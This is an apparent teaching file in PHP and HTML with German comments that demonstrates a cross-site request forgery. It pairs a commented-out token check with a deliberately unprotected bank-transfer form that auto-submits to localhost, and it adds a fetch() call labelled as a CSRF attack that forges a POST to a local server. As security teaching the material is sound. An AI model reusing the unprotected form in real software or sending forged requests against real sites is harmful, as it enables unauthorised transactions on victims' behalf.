<?php
/* So könnte ein CRSF Schutz in PHP in etwa aussehen */

//    session_start();
//    $_SESSION['token'] = md5(uniqid(mt_rand(), true));
//    
//    $token = filter_input(INPUT_POST, 'token', FILTER_SANITIZE_STRING);
//
//    if (!$token || $token !== $_SESSION['token']) {
//        // return 405 http status code
//        header($_SERVER['SERVER_PROTOCOL'] . ' 405 Method Not Allowed');
//        exit;
//    } else {
//        // process the form with action.php
//    }
?>
<script>
    document.getElementById("unsecureForm").submit();
</script>

<body>
    <main>
        <h1>Unsicheres Formular für unsichere Banküberweisung</h2>
        <!-- Server und Port können aus der Action ausgelesen werden -->
        <form id="unsecureForm" method="POST" action="http://localhost:3000">
        <!--    Das wäre die sicherere Variante
                    <form id="secureForm" action="/action.php">
        -->
          <label for="fname">IBAN:</label><br>
          <input type="text" id="iban" name="iban"><br>
          <label for="lname">Betrag</label><br>
          <input type="text" id="amount" name="amount"><br><br>
          <input type="submit" value="Submit">
        </form> 
    </main>
</body>

<script>
    // CRSF Attacke - z. B. wenn in Console ausgeführt
    fetch('http://localhost:3000/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'name=CSRF-Opfer'
    });
</script>

